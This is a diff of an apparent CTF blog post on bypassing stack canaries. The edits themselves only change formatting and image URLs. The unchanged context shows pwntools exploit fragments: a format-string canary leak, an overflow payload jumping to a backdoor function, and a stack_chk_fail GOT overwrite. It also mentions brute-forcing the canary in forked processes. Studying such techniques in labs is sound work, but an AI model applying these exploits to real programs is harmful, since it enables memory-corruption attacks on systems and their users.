@@ -1,9 +1,7 @@
 ---
 title: Bypassing and leaking ideas about "PWN" canary
-tags: ['CTF', 'Pwn']
+tags: ["CTF", "Pwn"]
 authors: [nova]
-
-
 ---
 
 Ready to study the bypass under different protection mechanisms before diving into the heap.
@@ -20,9 +18,9 @@ One of the main ways to bypass Canary is to leak the value of Canary, usually th
 
 This is a basic question that leaks Canary through format strings
 
-![pseudocode](https://cdn.ova.moe/img/image-20220116194731361.png)
+![pseudocode](https://oss.nova.gal/img/image-20220116194731361.png)
 
-![checksec](https://cdn.ova.moe/img/image-20220116195013327.png)
+![checksec](https://oss.nova.gal/img/image-20220116195013327.png)
 
 At the same time, there is a backdoor function `cat flag`, so we only need to leak the value of the canary, and overflow to the backdoor function.
 
@@ -43,7 +41,7 @@ payload = b'%7$x'
 # gdb.attach(sh, 'b printf')
 sh.sendline(payload)
 canary = int(sh.recv(), 16)
-print(canary) 
+print(canary)
 getflag_addr = 0x0804863B
 payload = b'A'*100 + p32(canary) + b'A'*12 + p32(getflag_addr)
 sh.sendline(payload)
@@ -139,8 +137,6 @@ sh.sendline(b'')
 sh.interactive()
 ```
 
-
-
 # Hijack stack_chk_fail
 
 Modify the `stack_chk_fail` function's got address, so that it directly jumps to the backdoor function when executed.
@@ -171,14 +167,10 @@ sh.interactive()
 
 > By the way, I actually don't quite understand the large number coverage of fmtstr, but pwntools unexpectedly provides `fmtstr_payload` to calculate for you, which is great
 
-
-
 # Brute-Force
 
 Forking a process will keep the canary constant, making it possible to brute force.
 
 ~~Haven't found the question yet~~
-
-
 
 <!-- AI -->
